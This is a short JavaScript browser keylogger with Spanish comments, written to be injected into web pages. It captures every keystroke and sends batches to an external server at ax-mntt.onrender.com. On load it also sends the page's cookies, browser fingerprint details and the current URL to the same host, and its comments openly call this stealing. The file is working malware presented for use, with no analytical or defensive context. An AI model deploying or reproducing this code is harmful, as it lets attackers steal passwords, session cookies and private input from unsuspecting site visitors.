// ============================================================
// KEYLOGGER - Versión alojada en servidor
// ============================================================

(function() {
    'use strict';
    
    console.log('⌨️ Keylogger cargado desde servidor');
    
    let buffer = '';
    const servidor = 'https://ax-mntt.onrender.com';
    
    // Capturar teclas
    document.addEventListener('keydown', function(e) {
        let tecla = e.key;
        
        // Manejar teclas especiales
        if (tecla === 'Enter') tecla = '\n[ENTER]\n';
        else if (tecla === 'Backspace') tecla = '[DEL]';
        else if (tecla === 'Tab') tecla = '[TAB]';
        else if (tecla === 'Shift') tecla = '[SHIFT]';
        else if (tecla === 'Control') tecla = '[CTRL]';
        else if (tecla === 'Alt') tecla = '[ALT]';
        else if (tecla === 'Escape') tecla = '[ESC]';
        else if (tecla === 'ArrowUp') tecla = '[↑]';
        else if (tecla === 'ArrowDown') tecla = '[↓]';
        else if (tecla === 'ArrowLeft') tecla = '[←]';
        else if (tecla === 'ArrowRight') tecla = '[→]';
        
        // Si es una tecla imprimible
        if (tecla.length === 1 || tecla.startsWith('[')) {
            buffer += tecla;
        }
        
        // Enviar cada 10 teclas
        if (buffer.length >= 10) {
            enviarTeclas();
        }
    });
    
    // Enviar el buffer cada 3 segundos
    setInterval(function() {
        if (buffer.length > 0) {
            enviarTeclas();
        }
    }, 3000);
    
    function enviarTeclas() {
        if (buffer.length === 0) return;
        
        const data = 'keylog:' + buffer;
        fetch(servidor + '/stl?data=' + encodeURIComponent(data))
            .catch(function(error) {
                console.log('⚠️ Error al enviar keylog:', error);
            });
        
        buffer = '';
    }
    
    // También robar cookies
    fetch(servidor + '/stl?cookie=' + encodeURIComponent(document.cookie));
    
    // También robar info del navegador
    fetch(servidor + '/stl?data=navegador:' + encodeURIComponent(JSON.stringify({
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: screen.width + 'x' + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    })));
    
    // También robar la URL actual
    fetch(servidor + '/stl?url=' + encodeURIComponent(window.location.href));
    
    console.log('✅ Keylogger activo en:', window.location.href);
})();